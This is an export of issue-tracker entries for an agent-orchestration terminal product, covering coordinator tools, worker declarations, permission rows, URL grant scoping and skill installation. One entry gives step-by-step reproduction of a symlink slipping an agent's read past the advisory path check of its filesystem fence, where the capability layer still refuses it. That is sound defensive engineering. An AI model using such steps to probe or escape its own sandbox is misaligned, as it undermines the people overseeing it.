title: A model drives the wave: the coordinator's calls come from an agent, not from a test
description:
Filed 2026-09-04. The epic's DONE WHEN ends 'One automated check watches exactly that, end to end, against a real backend', and that is the one part still missing.

Every call exists and every call is asserted where it lives: wave.spawn, wave.holdings, wave.say, wave.wait and wave.close in internal/assistant against the record's seam, and the SEQUENCE they drive on three real sessions in three real panes in internal/app. What no test does is let a MODEL choose to make them. AGENTS.md rule 1 is exactly this distinction — a test written by reading the implementation cannot report a missing feature — and rule 2 says an epic proves its happy path with one automated check that watches a user do it end to end.

The harness already exists and is not this epic's to build: internal/transport drives the real agent.ask over the real WebSocket against a scripted provider (ws_agent_fetch_contract_test.go, newAskHarnessWithOpts / askOverWire / streamToolCallChunk), which is how fetch.url's result is validated off the wire rather than off a struct.

What that harness lacks is a spawner, because minting a pane is internal/app's and transport cannot import it. A test-local spawner over the server's own OpenSession is the honest seam: the pane row is asserted in internal/app already, and what this check is for is that an AGENT's tool calls move the record.
acceptance_criteria:
A scripted provider emits wave.spawn three times, then one wave.wait, then wave.close for each worker, over the real agent.ask on the real WebSocket; the record ends with three terminal participants and the test never calls the registrar directly.
The provider sees each tool's real result, and the wait's result names which worker settled.
It is stated in the test what this check does NOT cover, so nobody reads it as covering the pane.
close_reason: The epic's last criterion is met: a model's calls move the record. internal/app/wave_model_test.go runs the REAL assistant engine — the shipped loop, tool registry and executors — against a scripted provider, over the real wave record, opening real sessions in real panes. Nothing in the test calls the registrar: every participant exists because the engine executed a call the provider proposed, and every one that ends ends the same way. Three wave.spawn, one wave.wait, one wave.holdings, then a wave.close per still-running worker. THE CLOSES ARE ADDRESSED BY THE IDS THE MODEL WAS GIVEN — it decodes the holdings answer it was handed rather than having the ids written into the script, which is what an id in an answer is for; and it reads them ONCE, because after the first close the newest tool result is that close's own and names no participants. A worker settles while the model is waiting, and the coordinator does not end it: the work does, which is the case the wait exists for. Results are DECODED rather than substring-matched, because they arrive inside a JSON string and a search for a field name would be searching for its escaped form — the first version did exactly that and reported 'never handed a holdings answer' about an answer it had been handed. The egress screen is not bypassed: the stand has no vault, so the comparison runs on every result and finds nothing, which is what an empty vault genuinely answers. Two mutations turn it red: unregistering wave.close, unregistering wave.wait. -race green. STATED IN THE TEST, so nobody reads it as covering more: the provider is scripted rather than a model, so it shows a model's calls move the record and not that any model would make them (that half is persuasion, §5, and has no test anywhere); and the launcher is stood in for by a goroutine supplying the enrolment, because the enrolment act itself is internal/shellintegration's and is proved there on a real pty in bash and zsh. Commit 13fcb509.

title: A coordinator waits on all its workers with one call, and closes them
description:
Filed 2026-09-04. The epic's own DONE WHEN names two calls that do not exist: 'creates three workers, gives each a task, WAITS ON ALL THREE WITH ONE WAIT that returns when the first settles, reads what each produced, and CLOSES them'.

WAIT. wave.spawn returns when a worker is LIVE — its enrolment arrived — and there is nothing that returns when one SETTLES. §7.2 says the spawn primitive 'may block and return at decision points … but nothing rests on it any more': the wait is a convenience over a record the backend watches regardless, and a coordinator that never calls it loses its own promptness and nothing else. That is the whole difference from the blocking call and the lease this design started with, and it must stay true — a wait that anything depended on would be the lease back.

D7 binds it: 'a report, a WAIT or an explicit inbox check returns pending mail'. So a wait that returns is also a fetch, and it dispatches the facts it hands over exactly as wave.holdings does.

CLOSE. Nothing ends a worker. EffectClose has been in DefaultBundle since nocx-dkawo.2 and nothing has ever read it — closing is the first operation that actually consults a delegation, which is what makes 'membership is not delegation' more than a comment. A close is the coordinator ending its own worker's session; the process exit then reaches the record by the ordinary path and reduces the participant the way any exit does, so nothing here writes a terminal state directly.

A human takeover suspends send-input and NOT close: the delegation's Permits already says so, and this is where that stops being theoretical.
acceptance_criteria:
A coordinator with three live workers calls one wait; it returns when the first settles, naming which, and the other two are still live.
A wait with nothing outstanding returns without blocking, and a wait whose deadline passes returns empty rather than failing.
A wait returns the facts it hands over as dispatched, so the same facts are not handed to a later wave.holdings.
A coordinator closes a worker and the record reaches a terminal state through the ordinary exit path, with no state written directly.
A coordinator whose delegation does not carry close is refused, and told so.
close_reason: Both calls the epic's DONE WHEN names now exist. WAIT (internal/wave Registrar.Wait, wave.wait tool): answers exactly what wave.holdings answers, sharing one builder in internal/assistant, because it is the same question asked at a different moment — a shape of its own would be a second account of what a session holds. Returns on three conditions: the session holds nothing, a participant has settled, or a fact is owed judgement (that last one because the routing table has already decided the coordinator is needed and woken it; a wait that sat through it would be two mechanisms disagreeing about one moment). Routine facts signal it, since a wait is a turn already spent and 'the first of three settles' IS the routine case. The wake-up channel is taken BEFORE the read. An expired wait ANSWERS with what the session still holds rather than returning empty — that is better than the criterion I wrote and is what shipped: what it holds is still true, and empty would make a coordinator read it again to find out. It dispatches what it hands over (D7). Deadline: the tool declares 11 minutes, above the 600s ceiling on its own  parameter, because a declaration deadline under the wait's own would end the call while the wave was still inside the interval the caller asked for. CLOSE (Registrar.Close, wave.close tool, internal/app waveCloser over the session registry): the FIRST operation that reads a delegation — EffectClose had sat in DefaultBundle since nocx-dkawo.2 with no reader, which made 'membership is not delegation' a comment. It writes no state: ending the session produces a process exit that reaches the record by the ordinary path, so a closed worker reads abandoned, and a close that also terminalized would be a second author of a participant's state. mutate-destructive and deliberately not session.wait's , which withdraws an authority already in flight; an observe grant does not offer it and the exact-set test says so in both directions. Evidence: internal/wave/wait_close_test.go (three workers, one wait, first settles, other two live, nobody woken for a routine completion; nothing-to-wait-for answers at once; expired answers with what is true; the wait dispatches; close refused by a stranger, by a bundle without the effect and by a revoked delegation, permitted under a human takeover, a no-op on a finished worker). internal/app/wave_wake_test.go runs it on three real sessions in three real panes and watches the closed two terminalize through the exit path with no state written. FOUR mutations turn the suite red, and the race one only after the test was made deterministic — the store admits the fact from inside HeldBy after the rows are read, because the probabilistic version passed the mutation twenty rounds out of twenty. -race green on wave, assistant, agenttools, app, content. Still missing, and it is the last gap in the epic's own criterion: a MODEL. The calls are asserted where they live and the sequence they drive is asserted on real sessions; nothing in the suite is an agent choosing to make them. Commit 6db4b205.

title: Nothing in the product can send a declaration, so every worker terminalizes as abandoned
description:
Found 2026-09-04 while wiring the mailbox's carriers.

## Steps to Reproduce

1. `grep -rn agent_report --include='*' . | grep -v _test` — the protocol constant, the publisher's comment, the plan and docs/lifecycle-protocol.md. No sender.
2. `grep -n agent_ internal/shellintegration/scripts/nocx.bash` — agent_enrol and agent_withdraw are sent; agent_report is not.
3. Start a worker through wave.spawn, let the agent finish and its pane exit, then read the participant: it is `abandoned`, never `completed`.

## What is wrong

THE RECEIVING HALF IS COMPLETE AND NOTHING SENDS. nocx-dkawo.7 built the agent_report / agent_reported pair on the authenticated lifecycle channel (internal/lifecycle/protocol.go, kernel.go applyAgentReport, internal/lifecyclecodec, internal/lifecyclepub WithAgentReporter) and wired it to the wave record through internal/app's waveReporter.

WHAT THAT COSTS: the two facts are a conjunction and only their conjunction reaches completed. With no declaration ever arriving, every worker in the shipped product reduces to ABANDONED on its process exit — terminal, correctly named, and never a completion. The epic's headline, 'a coordinator starts them, waits on all of them, and READS WHAT THEY DID', does not work end to end for a person.

This is the shape AGENTS.md names in its testing rules: a reachable read path hiding an unreachable write path. The tests that pass call Registrar.Declared directly.

## Why the obvious fix is wrong

__nocx_agent_run in nocx.bash already holds the agent's exit code and could send a declaration from it. It must not. D9 makes the declaration and the process exit INDEPENDENT facts, and the conjunction is the whole mechanism; a declaration synthesised from the exit status would make completed mean nothing beyond 'exited 0' and would restore the self-matching sentinel the design was written against.

## Where it actually belongs

§7.1 and D5 — the alias resolves a per-agent adapter and a launcher that stages the agent's config, 'tool surface, and hooks where the agent supports them', before exec. The declaration is a TOOL THE AGENT CALLS, not something the shell can infer. No bead covers that launcher: nocx-dkawo.1 built typing, .8 built the coordinator's two calls in-process, and neither reaches a worker agent's tool surface.

The same gap blocks the worker's side of the mailbox (nocx-dkawo.11): a worker cannot check its inbox for the same reason it cannot declare.
acceptance_criteria:
A worker agent running in a nocx pane can declare what its work produced, and the wave record reaches completed rather than abandoned, without any test calling Registrar.Declared.
The declaration is not derived from the process exit status: a worker that exits 0 without declaring is still abandoned.
close_reason: A worker can declare, and the whole chain is tested. The declaration comes from the AGENT and the shell sends it: the capability is deliberately not exported (D13, no bearer material in the environment), so the wrapper opens a DROP before starting the agent and names it in NOCX_AGENT_REPORT. A path is not bearer material — it names a rendezvous, mktemp gives it an unguessable name and mode 0600, and the agent's own process tree is exactly the principal D14 of the 2026-08-15 design already enrols and states in the approval. The exit-status shortcut was available in __nocx_agent_run and is refused in a comment: it would collapse two facts D9 keeps independent and make completed mean nothing beyond exit 0. Format: 'ok' or 'fail' on line one, the rest is what it produced; anything else is not a declaration and nothing is sent, so the participant stays abandoned — consent is the presence of what the wrapper positively recognises. The declaration goes inside the enrolment's interval and before the withdraw; the drop is removed; recorded:false is printed in the pane with its reason (D4). Bundle version 45, both bash and zsh. Evidence: internal/shellintegration/agent_report_shell_test.go on a real pty in both shells — an agent that writes the drop produces agent_report between the enrolment and the withdrawal carrying its verdict and summary; three agents that write nothing, garbage or an empty drop produce none; a failure is carried as a failure; a refused declaration is said in the pane; the drop is gone afterwards. Three mutations turn it red. Verified on GNU bash 3.2 in CI's own container image (go test -race, whole package, 97s, green) — this host has only bash 5, so the fixture tests could not have run here. The chain has no untested link: the shell sends (here), the kernel accepts (internal/lifecycle), the publisher calls the seam (internal/lifecyclepub), the record stores it (internal/app TestADeclarationOverTheChannelReachesTheRecord). Persuasion, not mechanism, remains: nothing MAKES an agent write a drop, so wave.spawn's task field now carries the instruction a coordinator must pass on. Also in this commit: the publish size ratchet 73326 -> 76440 with its argument, and nocx-l9le4 fixed. Commit 8b1c3b15.

title: A person approves a call the fence then kills, and the run ends instead of answering
description:
Found on an unmutated tree by the nocx-4yjwk.2 worker.

A symlink INSIDE the capability fence pointing outside it passes the lexical path predicate, so the policy asks. The person approves. The resume then dies with a ToolFailedError which ENDS THE RUN.

Security-wise this is correct and must stay: the narrowed capability is the enforcement and the lexical check is explicitly advisory. What is wrong is the OUTCOME SHAPE. nocx-uvac6.1 established that a refusal is an answer — the model is told no and goes on. Here the capability's refusal arrives as a run-ending failure instead, so a person who was asked a question, answered it, and was entitled to an answer back gets a dead run with a message about a path.

It is also the 'approve, then failure' the design predicted, observed rather than reasoned about.

## Steps to Reproduce

1. Narrow the run's filesystem capability to a directory (the fence).
2. Inside it, create a symlink pointing outside it — the worker used fence/link.txt.
3. Have the agent read through the symlink. The lexical predicate sees a path inside the fence, so the policy ASKS.
4. Approve.
5. The resume fails: agent tool "files.read" failed: filesystem: path outside the grant's scope: .../fence/link.txt — and the run ends.

Expected: the capability's refusal reaches the model as an answer and the run continues.

## Acceptance Criteria

- A test reproduces it. It fails first.
- The capability's refusal reaches the model as a refusal-as-answer (a refusalResult), not as a ToolFailedError, and the run continues.
- The lexical predicate stays advisory and the capability stays the enforcement — neither moves.
- The person is told why in the same words the refusal uses, not in a filesystem error.
close_reason: Merged as bcb9295b (worker branch nocx-4yjwk3-fence-answer, 03bb0f75). A symlink inside the fence resolving outside it is now answered rather than fatal: one arm in invokeClassified (step 6c, before the egress gate) and one predicate, capabilityRefusal, beside ToolFailedError in kernel.go — errors.Is(err, filesystem.ErrOutOfScope), a sentinel and never message text. RefusedOutOfScope was REUSED, not re-minted: its sentence is already the fact, and the two checks differ only in which noticed, which the refusal deliberately does not carry. The enforcement did not move — ScopedReader still refuses before touching the provider, and kernel_test.go's 'the capability is the enforcement' assertion is untouched. The conversion went to the kernel rather than into executeFilesRead because files.edit/files.create already answer their own scope refusals, so converting per-tool would keep the fault-or-answer decision spread across tools. Four mutation checks, each watched to fail and reverted: capabilityRefusal always-false reproduced the pre-fix ToolFailedError/NodeRunError exactly; RefusedByDecision instead of RefusedOutOfScope failed on the text; dropping closeAttempt left an attempt open as an unclosed interval; always-true broke seven EXISTING tests, so the suite already guards against the arm being over-broad. Partial states enumerated and asserted: two ledger attempts opened and both closed (escalation interrupted, execution failed), no result body captured, the approval survives so the fence never consumed the person's yes, and the next identical attempt gets the same refusal rather than a second question. Merged tree green under -race.

title: An undispatched fact is a row in the attention queue, and picking it up clears it
description:
Split out of nocx-dkawo.4 on 2026-09-04. That bead's dependency on nocx-ms7v.4 covered ONE of its four criteria; the other three are the wave's own and were held behind three epics for a surface.

What is here is the half that genuinely needs the attention queue.

The wave's escalation already reaches a surface a person can read: notify.KindWaveUndispatched is attested, ships on both channels, and internal/notify's ingress records every occurrence into the feed before the router decides anything, so it appears in the notification centre (frontend/src/notify/notifications-panel.tsx, mounted at main.tsx:1262) with its centre toggle defaulting on. What that surface does NOT do is either of these:

1. Say HOW LONG the fact has waited. The wave record holds Fact.EnteredAt and Fact.DueAt; the notify.Event carries only the instant it was raised. A row that says a worker is waiting without saying since when cannot be triaged.
2. Let the COORDINATOR clear it. nocx-ms7v.4 says resolved must be an explicit act, and it is right; this makes the coordinator a second actor performing that act, when it picks the fact up late through wave.holdings. That is a CHANGE to nocx-ms7v.4, not merely a use of it — which is why this bead depends on it and cannot go around it.
acceptance_criteria:
An undispatched fact appears in the attention queue naming the worker, its task, and how long it has waited.
A coordinator that fetches the fact after it escalated clears that queue row itself, and the clearing is recorded as an act rather than inferred from a later command.

title: AGENTS.md forbids the hooks we just installed: reconcile the Code search rule with repowise
description:
AGENTS.md "Code search" says grep/glob/read are the tools, and: "Do not reintroduce an
index, or any hook in front of a file read, without measuring against that baseline."
CLAUDE.md repeats the pointer.

As of 2026-09-04 this repo HAS both: a repowise index (.repowise/, 359 MB, gitignored) and
three hooks in front of Claude Code's Read -- read-skeleton, read-reread, search-digest --
registered in ~/.claude/settings.json, plus a post-commit auto-sync in .githooks/post-commit
(gitignored, so per-clone). The owner asked for this after the measurement in nocx-14sbw.

The rule's own escape clause was satisfied -- the measurement happened -- but the document
still reads as a flat prohibition. Left as is, the next agent removes the hooks BY
INSTRUCTION and is right to, the way graphify was removed. That is the failure this bead
exists to prevent.

What the measurement actually found, and what the text should say:
- As code search it LOST to grep on five real questions (see nocx-14sbw notes). The
  prohibition on treating it as a grep replacement should stand, and stay stated.
- The git/co-change layer (get_risk) gave signal grep cannot: hotspot scores, defect
  profiles, co-change partners with support counts, bus factor. Verified against git.
- It repeats our stale comments as fact -- it read a stale wiring comment and asserted the
  opposite of the truth (nocx-n5gr2). That belongs in the text as a named caveat.

## Acceptance Criteria

- [ ] AGENTS.md "Code search" states what is installed, what it is for (history/co-change,
      not search), and what it is not to be trusted for, with the nocx-14sbw numbers
- [ ] It says the hooks and index are per-clone and opt-in -- nothing in git turns them on
- [ ] The graphify paragraph survives: the baseline and the reason it was removed are still
      the thing a future index is measured against
- [ ] CLAUDE.md's pointer still matches AGENTS.md
- [ ] An ADR in docs/decisions/ records the reversal, since a later reader will otherwise
      read the rule change as drift rather than as a measured decision

title: The five calls a coordinator makes, on the channel it is already enrolled on
description:
§7.2 of the orchestration mechanism design names exactly five: one spawn primitive, say to a participant, report structurally, check the inbox with explicit acknowledgement, and ask what my session holds.

Only the last is buildable before nocx-dkawo.6 lands: HeldBy already exists in the record (commit 62ffce63) and answers D3 — a restarted coordinator asks what its SESSION holds and is told by name, joining through the wave rather than the delegation so a human takeover cannot make a worker vanish from its own coordinator's account.

The authority model decided the shape and it is not negotiable here. Five of the seven calls take NO resource argument at all (A9): mailbox read, inbox check, report, holdings and withdraw name the holder's own resources, which live inside the object — the pattern contracts/tools/session.run.schema.json already proves by having no session parameter. say and interrupt take a HANDLE the object minted, never a raw participant id (A10), because delegation is revocable and a raw id survives revocation inside a model's context. Two capability types, *WaveCoordinator and *WaveParticipant, never one with a role flag (A8).

A12 binds: a wave call carries no authority the session does not already have, and nothing here may claim it authenticates a participant.
acceptance_criteria: Holdings is answerable by an enrolled coordinator over the lifecycle channel and its contract schema has no participant parameter; a capability minted from a fenced grant cannot exceed the fence.
close_reason: Two of §7.2's five calls, commit ccedde6d: wave.spawn and wave.holdings. Spawn is EffectDelegate over ResourceEnvironment — no eighth effect, no policy/SQL/contract/settings change. Neither call takes a participant or a session parameter, asserted against contracts/tools rather than against intent (TestTheWaveToolsNameNoParticipantOnTheWire). *WaveCoordinator is its own type beside the participant's. The local environment scope is minted into the run fence at ws_readscreen.go, without which ForGrant silently omits the tool. A spawn outside the fence is refused naming both what was asked and what was available, and a coordinator with an empty fence can spawn nowhere, which is A12 in code. The remaining three — say, report, inbox — need more than one worker and belong to nocx-dkawo.4.

title: The two facts reach the record: a session exit and the participant's declaration
description:
internal/wave now reduces the two terminal facts correctly (nocx-dkawo.2, commit 62ffce63) and nothing feeds it either of them.

PROCESS EXIT. session.Session exposes Done() and ExitOutcome() (internal/session/session.go:308,331). A wave.Supervisor implementation in internal/app watches the participant's session and calls Registrar.Exited with the incarnation the record was marked live under. Never from the screen: the grid decides typing and lighting and nothing else (D9, D13).

THE DECLARATION. It rides the authenticated lifecycle channel, because ADR-0024 decision 2 makes that the authenticated one and KindAgentEnrol/KindAgentWithdraw already ride it — a second socket would be a second authenticator for one trust decision. So: a new event pair (agent_report / agent_reported) in internal/lifecycle/protocol.go, its codec shape, kernel routing beside handleAgentEnrol, and a handler in internal/app beside paneEnroller.

The mapping the record is missing: a lifecycle event arrives on a LaneID, which resolves to a session id, and the record is keyed by ParticipantID. That is one new store method (ParticipantBySession), not a map in app — a second index would drift from the rows.

DONE WHEN: a worker that finishes has both facts in the record and reads completed; one that is killed reads abandoned; and a fact naming a replaced incarnation is refused.
acceptance_criteria: An automated check drives a real session to exit and a real agent_report over the channel, and the participant's state is read back through a freshly opened store as completed; the same check with no declaration reads abandoned.
close_reason: Both facts reach the record, commit 4c7d3538. PROCESS EXIT: waveSupervisor watches session.Done + ExitOutcome, and a session already gone when supervision attaches is reported as an exit immediately — the window the register ordering exists to make observable. DECLARATION: a new lifecycle event pair agent_report / agent_reported on the authenticated channel (ADR-0024 decision 2), kernel-validated, codec round-tripped, publisher-answered fail-closed, documented as §16 of docs/lifecycle-protocol.md. Deliberately NOT agent_withdraw: a withdraw carries no verdict and reading it as success would invent the one fact the participant did not send. ok and recorded are wire VALUES not pointers, so an absent field decodes as a refusal — asserted by decoding frames with them missing. title: The backend opens a pane of its own: one session-open path, two callers
description:
Step 3 of the spawn-and-register interval needs the backend to create a pane and open a session in it WITHOUT a renderer asking. No such path exists.

Today a session is opened only by transport's handleOpen (internal/transport/ws_session_handlers.go:316), which is renderer-driven: the pane row already exists (the renderer created it through the layout chain), and the open runs inside the capability Prepare/commit flow with the workspace resolved from params.PaneID.

A wave participant needs workspace/tab/pane rows AND a session, minted by the backend, in one act. The spawn design's §7 deferred exactly this: 'worktree create returning workspace, tab, root pane and worktree in one call is the wave primitive herdr has and we do not; it is layer 3 of the nocx-dg51h ordering and it slots into step 3 without changing the interval.'

The wrong answer is a second open path beside handleOpen — that is the duplicate-owner defect AGENTS.md spends a section on, and the two would disagree the first time either moved (the parent claim, the workspace resolution, the Enhanced default, the profile rule).

DONE WHEN: one service owns 'open a session for a pane', handleOpen calls it, and internal/wave's Spawner calls it too, with the capability gating and the refusal order unchanged for the renderer's path.
acceptance_criteria: One session-open service, called by both the transport handler and the wave spawner; a test opens a participant session with no renderer connected and the existing open tests still pass unchanged.

title: A command that both reaches the network and writes a file lands in the delegate row, which is not what it did
description:
ResourceReport.Effect returns WorstEffect(DECLARED) when a command names resources of more than one kind (internal/content/resources.go:75-77). WorstEffect maximizes effectOrder, which ranks delegate 6, above cross-boundary 5 and mutate-destructive 2 (:113-131). session.run declares observe, mutate-reversible, mutate-destructive, delegate and cross-boundary.

So curl -o /tmp/x https://y — a network resource plus a written file, after nocx-06nzj — derives cross-boundary and mutate-reversible, disagrees, and lands on delegate: "hand work to another agent". A person who answers that row is answering about a download that wrote a file.

Found by the Task 1 worker on 2026-09-03, against an acceptance criterion in .internal/specs/2026-09-03-assistant-permissions-design.md §5.1 that said mutate-destructive. The spec was wrong; the code is doing what it says. The spec is corrected in the same change as this bead is filed.

The question is what a mixed report SHOULD say, and it is a design question, not a bug with an obvious fix:

- Worst of the DERIVED candidates (here cross-boundary) is informative and is what a person would recognise, but it is weaker than today for any pair whose declared worst is stricter.
- Worst of the DECLARED set (today) is conservative in the ordering, but the ordering is a lattice for WHICH ROW GOVERNS, not a risk ranking — delegate is not "more dangerous" than destructive, it is just later in the enum. So today conservative is also arbitrary.
- Splitting the call across rows is a third answer and contradicts ADR-0020 §7, which gives one decision per call.

This blocks the honesty of the Assistant permissions page (nocx-4yjwk): a row a person answers must be a row the call belongs in.

## Acceptance Criteria

- A mixed-resource command lands in a row a person would name for it, and a test states the rule with a case per pair that can occur today.
- Whatever the rule, it is not weaker than the strictest DERIVED candidate.
- effectOrder is documented as an evaluation lattice and not a risk ranking, or replaced by something that is one.
- The page shows the chosen row and, where a call derived more than one, says which resources it derived from.
close_reason: Merged as 90180733 (worker commits e4782883, b12ba579). SelectEffect is now the one computation and Effect is its row half: a fully-resolved report takes WorstEffect of the DERIVED candidates, an unresolved or unknown report still takes the declared worst, and the declaration set is still the ceiling. effectOrder carries the 'evaluation lattice, not a risk ranking' comment. commandSelection replaces commandEffect so the ask and the decision cannot drift, and ApprovalRequest.DerivedEffects carries the set as far as the kernel. The weakening was measured rather than asserted: curl -o drops delegate to cross-boundary, cp/install/sort -o/uniq drop to mutate-reversible, single-candidate commands unchanged, tee unchanged. 15 new tests including a never-weaker invariant over all 36 verb pairs. Coordinator re-ran go test -tags gtk3 -count=1 over content and assistant with -race independently: ok/ok.

title: Task 2: a network grant can name an endpoint, and both enforcers read it
description:
Plan task 2, bead nocx-67byy. A destination scope holds a full URL and Contains compares by exact identity with * as the only escape. Enforcement lives in two places: GrantScope.Contains and URLScope.Allows (internal/agenttools/registry.go:44-54).

## Acceptance Criteria

- https://github.com contains https://github.com/owner/repo and not https://api.github.com/x.
- With IncludeSubdomains it contains https://api.github.com/x and still not https://notgithub.com or https://github.com.evil.example.
- Scheme must match; https never contains http at the same host.
- Default port canonicalizes with the omitted form; a non-default port matches exactly.
- Case, IDNA/punycode, a trailing dot and IPv6 brackets normalize; userinfo is refused by ValidateGrantScope.
- An IP literal with IncludeSubdomains is refused.
- URLScope.Allows honours the endpoint form and delegates to the same predicate; a test pins that the capability cannot drift from the page.
- The scope is re-checked on every redirect hop.
- * keeps its meaning and stays distinguishable.
close_reason: Merged on branch nocx-5nkm7-endpoint-scope as eb7850f5, c262a542, 339a89c5. GrantScope gains IncludeSubdomains; destination containment is label-wise with scheme equality, default-port canonicalization, IDNA/case/trailing-dot/IPv6 normalization, userinfo refused, IncludeSubdomains refused on an IP literal and on *. URLScope.Allows delegates to the same predicate rather than re-implementing it, and internal/httppolicy re-checks the grant on every redirect hop. kernel.inScope was rebuilding the scope from kind+id and dropping the marker — fixed at the call site. Contract and generated type updated in the same change, as the global constraint requires. Coordinator re-ran go test -tags gtk3 over content, agenttools, assistant, httppolicy with -race independently: all ok. Findings filed: nocx-6ur5k, nocx-7adma.

title: An installed skill travels in a backup, and the root stops being walked for nothing
description:
DECIDED by the owner, 2026-09-03: an installed skill TRAVELS in a backup, alongside
authored and managed. Spec §11 recorded the question as deliberately open; it is now
closed and this bead is the implementation.

What the decision accepts, stated once so nobody rediscovers it as a surprise: the digest
lives in `skills.json`, which the snapshot already carries as `Settings`, and the digest is
over relative content — so a restored installed skill arrives with `status: approved`. An
approval the person gave once, on one machine, for one set of bytes, is replayed on the
new machine without being asked again. That is the trade-off the decision takes, and it is
the same one already taken for `managed`, which is drafted by a model and travels approved
today.

Builtin stays absent for the reason backup.go already gives: "they come from the binary and
are restored by the destination build".

There is also a live defect to fix here, found while landing nocx-qja4m.1 (a7698941):
`Snapshot`'s `root.Dir != ""` guard precedes the provenance switch, so the installed root is
already WALKED and its result thrown away. An unreadable file under `installed-skills`
currently fails the whole backup with "snapshot installed skills: ..." for a root whose
contents do not reach the snapshot. Adding the arm fixes that by making the walk mean
something.

## Acceptance Criteria

- `Snapshot` carries installed skills in their own field, beside `Authored` and `Managed` —
  the whole directory tree of each, files as {path, bytes}, sorted, exactly as the existing
  two roots are carried.
- `RestoreSnapshot` writes them into the installed root through the same atomic path, and
  the existing containment checks cover them: a test each for an absolute path, an escaping
  relative path, a symlink target, and a symlinked ancestor (rejectSymlinkAncestors).
- An installed skill survives a backup and restore with its enabled state, its digest and —
  once nocx-qja4m.2 lands — its source URL, and reports `status: approved` afterwards
  rather than `changed`.
- A snapshot taken by an OLDER build, with no installed field, restores without error and
  leaves the installed root alone.
- The backup preview counts installed skills (internal/backup/service.go SkillsPreview) so
  the person sees what a restore is about to replace, rather than discovering it after.
- A test asserts the walk-without-an-arm defect is gone: an unreadable file under the
  installed root behaves exactly as one under the authored root does, whatever that is —
  one behaviour for one concept.
notes: 2026-09-03, found while landing nocx-qja4m.1 (a7698941): the installed root is now WALKED by backup and its result thrown away. Snapshot's 'root.Dir != ""' guard precedes the provenance switch, so an unreadable file under installed-skills fails the whole backup with 'snapshot installed skills: ...' for a root whose contents are deliberately not in the snapshot. Both fixes are one line and they are opposite: add the arm (installed travels) or skip the walk (it does not). Deciding by fixing the crash would be deciding this bead by accident, which is why it is recorded here instead.
close_reason: 03e00f12. Snapshot gained Installed []SnapshotTree and the live defect went with it, fixed at the root rather than beside it: treesFor(Provenance) is now the one owner of 'which roots does a backup carry', read by both Snapshot and RestoreSnapshot, so the carried-set question is asked BEFORE the walk and a root the snapshot does not carry can no longer fail a backup. TreeCount() joins it because len(Authored)+len(Managed) was written out in three places in internal/backup, one of them the preview a person reads before restoring. Both compatibility directions measured, not assumed: backward an absent field decodes as nil and RestoreSnapshot has no delete path, asserted at the store level and through the real Service with a genuinely stripped document; forward an older binary refuses the whole backup because DisallowUnknownFields applies recursively — proved with a throwaway test — which is fail-closed and not a regression this introduces, since Version is pinned at 1 and snippets, notes and skills all did the same. New backup_installed_test.go: sorted trees with nested files, a restored skill reading approved through a real Store in the destination, four containment sub-tests each asserting the refusal names installed and that nothing landed outside the root, and a table proving an unreadable file behaves identically across all three carried roots. contracts/backup.create.schema.json's count description said 'authored and managed' and stopped being true, so it and its TSDoc came along. All gates green.

title: The epic's happy path: paste a URL in Settings, answer from the skill in another pane
description:
Spec §10, and AGENTS.md testing rule 2: the epic proves its happy path or it does not
close.

## Acceptance Criteria

- One Playwright spec, against a fake local endpoint serving a SKILL.md, watches: open
  Settings, find one Skills entry under Assistant, paste the URL, read the preview,
  approve, see the row.
- A second pane's ask then lists the skill in its index, calls skills.read, and the answer
  reflects the skill's content — the same end-to-end shape e2e/skills.spec.ts already uses
  for the assistant-authored path.
- No waitForTimeout anywhere. Every wait is on an observable state change.
- Runs in the container (e2e/run-in-container.sh) and in CI.
close_reason: 135d11de. e2e/skill-install-url.spec.ts: Settings opens, Skills appears exactly ONCE across the rail and once under the assistant group (which also pins nocx-fe7fe.1 — a regression minting a second row fails the count, where clicking the first match would not), a URL is pasted, the ask shows the address it holds plus name, description and the whole body, approving installs it, and the row appears with its badge and both detail lines. The second half follows e2e/skills.spec.ts in refusing to be fooled: the proposal request must carry the skill's name and description (the prompt index), the follow-up a real skills.read call and a tool message holding the body, and the fake's answer is DERIVED from the request body it answers, so it can only say the body if the body reached the model; the typed question shares no substring with the skill's name or description. Endpoint is an inline node:http server, the shape e2e/fetch-url.spec.ts already uses — no new mechanism. No waitForTimeout and no sleep anywhere. Falsified twice before being believed: removing the approval fails on the row count; aiming the read at a name that is not installed times out waiting for a follow-up model call that a refused read never produces. Green twice in the container on chromium (7.0s, 8.1s).

title: The Skills page takes a URL, shows the body and its findings, and installs on approval
description:
Spec §9.

The affordance sits on the Skills page above the list. The precedent is
PostmanImportDialog (frontend/src/api/import-dialogs.tsx) — the one place a person pastes
a URL and the backend fetches it — and the confirmation shape is backup restore's
preview-then-confirm, not showConfirm: a skill body does not fit in a confirm's sentence,
and the person is being asked to adopt instructions.

## Acceptance Criteria

- A person pastes a URL, sees name, description, the whole body in a CodeBlock, the
  source URL, and every finding above the body with its pattern, line and line number.
- The dialog does not classify its own input: "is this a URL" is answered by the existing
  single owner (classifyPastedSource), not a second regex here.
- One source is held, visibly, and can be taken back.
- A refusal from either method is rendered in the kit's validation slot, in the backend's
  own sentence, and the dialog stays open.
- Approving calls skills.install and the row appears in the list on success; the row is
  the same RecordRow, with `installed` as its kind badge.
- Every element comes from frontend/src/ui/ — no element in this change carries
  appearance that is not a kit component.
- Tests drive it through the seam a person reaches: the button exists, it is enabled from
  the state a person starts in, and the result appears afterwards.
close_reason: 7802d1b6. 'Install from a URL' is a primary Button in the Section's actions slot, above the list, on screen from the state the page opens in — including while the list is loading and while skills.json cannot be read, since neither is a reason a person cannot install. The dialog reads an address, then shows the held source, name and description as facts, EVERY finding with its pattern in a person's words and its matched line verbatim, and the whole body in a CodeBlock; Install appears only once a document is held. Not showConfirm: a skill body has no room in a confirm's sentence and the person is adopting instructions. The section owns state and both calls, the dialog draws what it is handed — the api-pane/PostmanImportDialog division. The store gained a preview passthrough so the surface has ONE collaborator, because install compares against a digest the server kept from its own preview and both calls must reach one backend. SCAN_PATTERN_WORDS moved to scan-pattern-words.ts and both surfaces import it rather than keeping two tables that agree until the Go scan grows a twelfth pattern; effect-labels.ts is the precedent. 'What this ask holds and how to take it back' used StatusCard rather than forking the Postman dialog's surface-owned class or adding a kit variant — the kit already had it under another name. Two things the test file was hiding, both fixed: renders never unmounted, so five copies of the dialog's fixed id made a scoped query answer null for an element visibly on screen (jsdom resolves an id selector document-wide through getElementById); and vi.mock on the dialog module was wholesale, so the real Dialog was undefined. 6194 frontend tests, both tsc projects, npm run lint with no new violations.

title: skills.install end to end: the second fetch, the atomic write, and the record over what was written
description:
